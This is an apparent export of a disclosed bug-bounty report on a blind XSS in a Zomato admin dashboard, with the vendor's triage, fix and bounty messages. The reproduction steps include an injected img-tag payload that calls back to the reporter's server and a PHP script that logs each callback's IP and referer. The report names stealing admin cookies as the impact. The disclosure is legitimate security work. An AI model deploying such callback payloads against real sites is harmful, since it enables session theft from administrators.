{"id":461272,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NjEyNzI=","url":"https://hackerone.com/reports/461272","title":"[www.zomato.com] Blind XSS in one of the admin dashboard","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-12-12T14:17:59.211Z","submitted_at":"2018-12-12T14:17:59.211Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"khoiasd","url":"/khoiasd","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/128/163/b1b8a0b050c57445967d7aba4e2476e9f5b145ec_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-05-01T07:05:15.495Z","bug_reporter_agreed_on_going_public_at":"2018-12-17T07:00:26.866Z","team_member_agreed_on_going_public_at":"2019-05-01T07:05:15.409Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nAdmin dasboard ████ from user has XSS Vul\n\n## Steps To Reproduce:\n  1. Login ██████\n  1. Go to ███ function and intercept request\nPost data: \"\u003e\u003cimg src=\"http://\u003cmy_server_ip\u003e/zomato.php?c=zomato_xss\" /\u003e\n\n```\nPOST ████ HTTP/1.1\nX-Zomato-App-Version-Code: 5610001\n██████████\n███████\nX-Zomato-API-Key: ███████\nX-App-Language: \u0026lang=en\u0026android_language=en\u0026android_country=VN\nX-Zomato-App-Version: 561\nX-Network-Type: wifi\nX-Present-Long: ███████\nX-Zomato-UUID: ████████\nX-O2-City-Id: 35\nUser-Agent: \u0026source=android_market\u0026version=7.1.2\u0026device_manufacturer=samsung\u0026device_brand=samsung\u0026device_model=SM-N9005\u0026app_type=android_ordering\nX-Access-Token: █████\nX-Device-Pixel-Ratio: 1.5\nX-City-Id: 35\nX-Device-Width: 720\nContent-Type: application/x-www-form-urlencoded\nAkamai-Mobile-Connectivity: type=wifi;appdata=com.application.zomato.ordering;prepositioned=true;websdk=18.4.2;carrier=Viettel Telecom/452,04;devicetype=1;rwnd=2097152;\nX-Client-Id: zomato_android_v2\nX-Present-Lat: ██████\n██████\nX-Device-Height: 1280\nContent-Length: 156\nHost: api.zomato.com\nConnection: close\n\n█████=\"\u003e\u003cimg+src%3d\"http%3a//\u003cmy_server_ip\u003e/zomato.php%3fc%3dzomato_xss\"+/\u003e█████████\n```\n\n 1.  File **zomato.php** on my server:\n\n```\n\u003c?php\n$time = date('Y-m-d H:i:s', time());\n$refer = $_SERVER['HTTP_REFERER'];\n$ip = $_SERVER['REMOTE_ADDR'];\n$c = isset($_GET['c']) ? $_GET['c']: '0';\nfile_put_contents(\"log.txt\",\"Time: \". $time .\"IP: \". $ip.\" Referer: \".$refer. \"C: \". $c . \"\\n\", FILE_APPEND);\n?\u003e\n```\n 1. XSS triggered when Admin viewed the ███████.\n\n 1. Result in file **log.txt** time UTC\n\n```\nTime: 2018-12-12 13:49:25IP: █████ Referer: C: zomato_xss\nTime: 2018-12-12 14:01:17IP: ████████ Referer: C: zomato_xss\n```\n\nI captured 2 ip from India.\nPlease verify for me.\n\n## Impact\n\n* Steal admin cookies.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":96,"voters":["badf00d","vavkamil","s1r1u5","base_64","kickino","sameerphad72","yeuchimse","ta8ahi","mik317","ahiezer","and 86 more..."],"severity":{"rating":"high","score":7.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":383,"asset_type":"URL","asset_identifier":"*.zomato.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3813307,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @khoiasd,\n\nThank you for your submission. We are investigating your report, and will let you know if we have any questions. We appreciate your assistance and cooperation.\n\nPrateek","automated_response":false,"created_at":"2018-12-12T14:23:33.731Z","updated_at":"2018-12-12T14:23:33.731Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3813312,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-12-12T14:24:32.612Z","updated_at":"2018-12-12T14:24:32.612Z","additional_data":{"old_severity":"Critical","new_severity":"High (7.1)","old_severity_id":260786,"new_severity_id":260789},"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3823935,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-12-14T06:56:53.568Z","updated_at":"2018-12-14T06:56:53.568Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Zomato"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"zomato","collaborator":{"username":"khoiasd","url":"/khoiasd"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3823966,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your bounty :). Can I disclose this bug?","automated_response":false,"created_at":"2018-12-14T07:14:41.555Z","updated_at":"2018-12-14T07:14:41.555Z","actor":{"username":"khoiasd","cleared":false,"url":"/khoiasd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/128/163/b1b8a0b050c57445967d7aba4e2476e9f5b145ec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3823969,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@khoiasd - We can do the disclosure once it's fixed :) Will let you know once we have an update.\n\nPrateek","automated_response":false,"created_at":"2018-12-14T07:15:51.276Z","updated_at":"2018-12-14T07:15:51.276Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3836381,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This has been fixed, can you please check and confirm @khoiasd.\n\nThanks for helping us keep @zomato secure.\n\nPrateek","automated_response":false,"created_at":"2018-12-17T06:12:21.964Z","updated_at":"2018-12-17T06:12:21.964Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"khoiasd","url":"/khoiasd"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3836470,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, I confirm,  this bug may have been fixed, I don't receive any request to my server. So if this admin dasboard is public, can I have a test credentials for confirm and test other bug?\nCan I disclosure a summary about this report. Thank you.","automated_response":false,"created_at":"2018-12-17T06:58:31.418Z","updated_at":"2018-12-17T07:01:06.108Z","actor":{"username":"khoiasd","cleared":false,"url":"/khoiasd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/128/163/b1b8a0b050c57445967d7aba4e2476e9f5b145ec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3836473,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-12-17T07:00:26.897Z","updated_at":"2018-12-17T07:00:26.897Z","first_to_agree":true,"actor":{"username":"khoiasd","cleared":false,"url":"/khoiasd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/128/163/b1b8a0b050c57445967d7aba4e2476e9f5b145ec_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3836504,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2018-12-17T07:14:12.441Z","updated_at":"2018-12-17T07:14:12.441Z","additional_data":{"old_title":"Stored XSS in Admin dashboard","new_title":"[www.zomato.com] Blind XSS in one of the admin dashboard"},"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3836513,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2018-12-17T07:18:36.198Z","updated_at":"2018-12-17T07:18:36.198Z","additional_data":{"added_weaknesses":[{"id":60,"name":"Cross-site Scripting (XSS) - Generic"}],"removed_weaknesses":[{"id":62,"name":"Cross-site Scripting (XSS) - Stored"}]},"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4697979,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-05-01T07:05:15.436Z","updated_at":"2019-05-01T07:05:15.436Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4697980,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-05-01T07:05:15.516Z","updated_at":"2019-05-01T07:05:15.516Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}